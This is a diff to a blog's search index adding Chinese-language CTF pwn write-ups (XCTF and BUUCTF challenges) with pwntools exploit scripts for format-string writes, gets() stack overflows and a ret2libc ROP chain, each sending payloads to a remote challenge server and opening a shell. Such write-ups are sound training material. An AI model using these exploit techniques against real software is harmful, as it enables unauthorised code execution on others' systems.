@@ -4,6 +4,85 @@
   
     
     <entry>
+      <title>实时数据检测</title>
+      <link href="/2022/01/14/data/"/>
+      <url>/2022/01/14/data/</url>
+      
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/14/data/checksec.png" alt="image-20220114192523091" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/14/data/main.png" alt="image-20220114192624436" style="zoom:80%;"><p>​        只要令key的值为35795746便可以getshell</p><ul><li><p><strong>达到任意地址写的核心在于提供如下格式化字符串: printf(“%s%n”,str,&amp;num)</strong></p></li><li><p>如何修改num的值为很大?</p><p>写入num的值为printf打印出来的所有字符总和,但是如何在内存中构建很大的字符串呢?还要恰好满足长度合适.其实这里可以用格式化控制的输出,printf(“%08x”,num)的含义为十六进制打印,打印时不满8位的补齐8位.</p></li><li><p>如何将num的地址传入</p><p>在调用printf之前,父函数的栈上即为输入的字符串s,调用printf时,是将s的地址作为第一个参数传入,由于printf并不知道自己有几个参数,完全取决于格式化字符串的格式化控制,并且在printf的栈的ebp上即为父函数的栈空间,其中就能找到字符串s,因此可以将num的地址写在s中,在printf(“%吗$n”)的语法中,m为具体数值,表示第几个参数作为num的地址,并写入打印出的字符个数.</p></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./data")local = 0if local:    r = process("./data")else:    r = remote("111.200.241.244",50260)key_addr = 0x0804A048key_value = 0x2223322#payload =flat(["%12$n",p32(key_addr),p32(key_value)])payload = fmtstr_payload(12,{key_addr:key_value})r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><strong>fmtstr_payload函数</strong></p><p><em>class</em> pwnlib.fmtstr.AtomWrite(<em>start</em>, <em>size</em>, <em>integer</em>, <em>mask=None</em>)[<a href="https://github.com/Gallopsled/pwntools/blob/67b28491a4/pwnlib/fmtstr.py#L161-L279">source]</a></p><p>This class represents a write action that can be carried out by a single format string specifier.</p><p>Each write has an address (start), a size and the integer that should be written.</p><p>Additionally writes can have a mask to specify which bits are important. While the write always overwrites all bytes in the range [start, start+size) the mask sometimes allows more efficient execution. For example, assume the current format string counter is at 0xaabb and a write with with integer = 0xaa00 and mask = 0xff00 needs to be executed. In that case, since the lower byte is not covered by the mask, the write can be directly executed with a %hn sequence (so we will write 0xaabb, but that is ok because the mask only requires the upper byte to be correctly written).</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xctf </tag>
+            
+            <tag> 格式化字符串 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>反应釜开关控制</title>
+      <link href="/2022/01/14/tnt/"/>
+      <url>/2022/01/14/tnt/</url>
+      
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/14/tnt/checksec.png" alt="image-20220114174102502" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/14/tnt/run.png" alt="image-20220114174205890" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/14/tnt/main.png" alt="image-20220114174250585" style="zoom:80%;"><p><strong>write函数</strong></p><ul><li>头文件:&lt;unistd.h&gt;</li><li>write函数有两种用法<ul><li>一种是:ssize_t write(int fd,const void *buf,size_t nbyte);<ul><li>fd: 文件描述符,write是写,所以文件描述符就是1</li><li>buf: 指定的缓冲区,即指针,指向一段内存单元;</li><li>nbyte: 要写入稳定的字节数</li><li>返回值: 写入文档的字节数(成功);</li><li>write函数把buf中nbyte写入文件描述符handle所指的文档,成功时返回写的字节数,错误时返回-1.</li></ul></li><li>另一种是:write(const char* str,int n)<ul><li>str是字符指针或字符数组,用来存放一个字符串,n是int型,它用来表示输出显示字符串中字符的个数.</li><li>write(string,strlen(string));表示输出字符串常量</li></ul></li></ul></li></ul><p><strong>sprintf</strong></p><ul><li><p>sprintf指的是字符串格式化命令，函数声明为 int sprintf(char *string, char *format [,argument,…]);，主要功能是把<a href="https://baike.baidu.com/item/%E6%A0%BC%E5%BC%8F%E5%8C%96/650">格式化</a>的数据写入某个<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6/4768913">字符</a>串中，即发送<a href="https://baike.baidu.com/item/%E6%A0%BC%E5%BC%8F%E5%8C%96/650">格式化</a>输出到 string 所指向的字符串。sprintf 是个<a href="https://baike.baidu.com/item/%E5%8F%98%E5%8F%82/9844833">变参</a>函数。使用sprintf 对于写入buffer的字符数是没有限制的，这就存在了buffer溢出的可能性。解决这个问题，可以考虑使用 snprintf函数，该函数可对写入字符数做出限制.</p></li><li><p>int sprintf(char *string, char *format [,argument,…]);</p></li><li><p><strong>string</strong>– 这是指向一个字符数组的指针，该数组存储了 C 字符串。</p></li><li><p><strong>format</strong>– 这是字符串，包含了要被写入到字符串 str 的文本。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。format 标签属性是**%[flags][width][.precision][length]specifier**</p></li><li><p>***[argument]…***：根据不同的 format 字符串，函数可能需要一系列的附加参数，每个参数包含了一个要被插入的值，替换了 format 参数中指定的每个 % 标签。参数的个数应与 % 标签的个数相同。</p></li><li><p>把格式化的数据写入某个<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a>缓冲区。</p></li><li><p><strong>返回值</strong></p><p>如果成功，则返回写入的字符总数，不包括字符串追加在字符串末尾的空字符。如果失败，则返回一个负数。</p><p>sprintf 返回以<strong>format为格式argument为内容组成的结果</strong>被写入string的字节数，结束字符‘\0’不计入内。即，如果“Hello”被写入空间足够大的string后，函数sprintf 返回5。</p></li></ul><p><strong>gets()函数</strong></p><ul><li><p>头文件: #include&lt;stdio.h&gt;</p></li><li><p>get()函数用于从缓冲区中读取字符,其原型如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">char *gets(char *string)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>gets()函数从流中读取数据,直到换行符或读到文件尾为止,最后加上NULL为字符串结束.所读取的字符串暂存在给定的参数string中</p></li><li><p>若成功则返回string的指针,否则返回NULL</p></li><li><p>由于gets()不检查字符串string的大小,必须遇到换行符或文件结尾才会结束输入,因此容易造成缓冲区溢出的安全性问题,导致程序崩溃,可以使用fgets()代替.</p></li></ul><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>程序中有gets函数,明显的栈溢出.</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *elf = ELF("./tnt")log_level = 'debug'local = 0if local:    r = process("./tnt")else:    r = remote("111.200.241.244",63927)bin_sh = 0x04005FAshell = 0x04005F6payload = b'a'*(0x200+0x8) + p64(bin_sh)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 栈溢出 </tag>
+            
+            <tag> xctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>随笔</title>
+      <link href="/2022/01/14/noname/"/>
+      <url>/2022/01/14/noname/</url>
+      
+        <content type="html"><![CDATA[<ul><li><p><strong>flat(*args, preprocessor = None, length = None, filler = de_bruijn(),</strong></p><p>Flattens the arguments into a string.</p><p>This function takes an arbitrary number of arbitrarily nested lists, tuples and dictionaries. It will then find every string and number inside those and flatten them out. Strings are inserted directly while numbers are packed using the <a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.pack"><code>pack()</code></a> function. Unicode strings are UTF-8 encoded.</p><p>Dictionary keys give offsets at which to place the corresponding values (which are recursively flattened). Offsets are relative to where the flattened dictionary occurs in the output (i.e. <code>{0: 'foo'}</code> is equivalent to <code>'foo'</code>). Offsets can be integers, unicode strings or regular strings. Integer offsets &gt;= <code>2**(word_size-8)</code> are converted to a string using <a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.pack"><code>pack()</code></a>. Unicode strings are UTF-8 encoded. After these conversions offsets are either integers or strings. In the latter case, the offset will be the lowest index at which the string occurs in filler. See examples below.</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 知识点 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>栈迁移</title>
       <link href="/2022/01/14/stack-migrate/"/>
       <url>/2022/01/14/stack-migrate/</url>
@@ -87,7 +166,7 @@
       <link href="/2022/01/12/buuctf/"/>
       <url>/2022/01/12/buuctf/</url>
       
-        <content type="html"><![CDATA[<ol><li><p>pwn1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./pwn1")local = 0if local:   r = process("./pwn1")else:   r = remote("node4.buuoj.cn",29317)bin_sh = 0x000000000040118Asystem_addr = 0x0000000000401191payload = b'a'*0x0F + p64(system_addr) + p64(bin_sh)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>warmup_csaw_2016</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch= 'amd64',log_level='debug')elf = ELF("./warmup")local = 0if local:    r = process("./warmup")else:    r = remote("node4.buuoj.cn",29230)addr = 0x000000000040060epayload = b'a'*72 + p64(addr)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li><p>cisn_2019_n_1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='amd64',log_level='debug')elf=ELF("./ciscn")local = 0if local:    r = process("./ciscn")else:    r = remote("node4.buuoj.cn",28539)v2=0x41348000 //11.28125的十六进制形式payload = b'a'*(0x30-0x04)+p64(v2)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li><li><p>pwn1_sctf_2016</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./pwn1_sctf")local = 0if local:    r = process("./pwn1_sctf")else:    r = remote("node4.buuoj.cn",28883)get_flag = 0x08048F0Dpayload = b'I'*20 + b'a'*4 + p32(get_flag)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>level0</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./level0")local = 0if local:    r = process("./level0")else:    r = remote("node4.buuoj.cn",26837)call_system = 0x0000000000400596payload = b'a'*0x80+p64(0)+p64(call_system)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
+        <content type="html"><![CDATA[<ol><li><p>pwn1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./pwn1")local = 0if local:   r = process("./pwn1")else:   r = remote("node4.buuoj.cn",29317)bin_sh = 0x000000000040118Asystem_addr = 0x0000000000401191payload = b'a'*0x0F + p64(system_addr) + p64(bin_sh)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>warmup_csaw_2016</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch= 'amd64',log_level='debug')elf = ELF("./warmup")local = 0if local:    r = process("./warmup")else:    r = remote("node4.buuoj.cn",29230)addr = 0x000000000040060epayload = b'a'*72 + p64(addr)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.cisn_2019_n_1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='amd64',log_level='debug')elf=ELF("./ciscn")local = 0if local:    r = process("./ciscn")else:    r = remote("node4.buuoj.cn",28539)v2=0x41348000 //11.28125的十六进制形式payload = b'a'*(0x30-0x04)+p64(v2)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4.pwn1_sctf_2016</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *log_level = 'debug'elf = ELF("./pwn1_sctf")local = 0if local:    r = process("./pwn1_sctf")else:    r = remote("node4.buuoj.cn",28883)get_flag = 0x08048F0Dpayload = b'I'*20 + b'a'*4 + p32(get_flag)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5.level0</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./level0")local = 0if local:    r = process("./level0")else:    r = remote("node4.buuoj.cn",26837)call_system = 0x0000000000400596payload = b'a'*0x80+p64(0)+p64(call_system)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>6.ciscn_2019_c_1</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os= 'linux',arch='amd64',log_level='debug')elf=ELF("./ciscn_2019")local = 0if local:    r = process("./ciscn_2019")else:    r = remote("node4.buuoj.cn",29853)def encrypt(paylaod):    l = list(payload)    for i in range(len(l)):        if l[i].isdigit():            l[i] = chr(ord(l[i])^0xF)        if l[i].isupper():            l[i] = chr(ord(l[i])^0xE)        if l[i].islower():            l[i] = chr(ord(l[i])^0xD)       return ''.join(l)             pop_rdi = 0x0000000000400c83pop_ret = 0x00000000004006b9main_addr = 0x0000000000400B28put_plt = elf.plt['puts']put_got = elf.got['puts']r.recv()r.sendline("1")r.recvuntil("encrypted")payload = b'1'*(0x50+8) + p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(main_addr)payload = encrypt(payload)r.sendline(payload)r.recvuntil("Ciphertext\n")r.recvuntil("\n")puts_addr = u64(r.recvline()[:-1].ljust(8,'\x00'))log.success('puts_addr='+hex(puts_addr))puts_offset = 0x0809c0libc_base = puts_addr - puts_offsetlog.success('libc_base'+hex(libc_base))r.sendlineafter("choice!","1")system_offset = 0x04f440bin_sh_offset = 0x1b3e9asys_addr = libc_base + system_offsetbin_sh = libc_base + bin_sh_offsetpayload1 = b'a'*(0x50+0x8) + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)r.sendline(payload1)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
       
       
       <categories>
